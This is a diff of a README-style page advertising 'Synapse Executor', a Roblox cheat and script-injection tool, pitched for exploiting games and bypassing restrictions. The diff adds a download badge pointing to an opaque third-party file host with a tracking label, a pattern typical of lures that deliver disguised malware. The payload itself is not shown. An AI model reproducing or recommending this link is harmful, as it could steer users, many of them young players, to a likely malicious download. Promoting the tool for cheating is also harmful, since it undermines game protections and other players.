@@ -1,6 +1,6 @@
 **Synapse Executor for Roblox** is an advanced scripting tool that allows players to run custom Lua scripts in Roblox games. It is widely used for exploiting, automating tasks, and testing scripts to modify game mechanics or gain in-game advantages. Synapse Executor offers a robust set of features, including the ability to bypass restrictions, unlock hidden features, and enhance gameplay with custom functions. While powerful, it is typically used by experienced users who understand the risks involved.
 
-**Download Synapse Executor**
+[![Download Synapse Executor](https://img.shields.io/badge/Download-SynapseExecutor%20-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
 
 **Common Features in Synapse Executor:**
 - **Custom Script Execution:** Run complex Lua scripts to modify Roblox games, automate tasks, and create custom game behaviors.
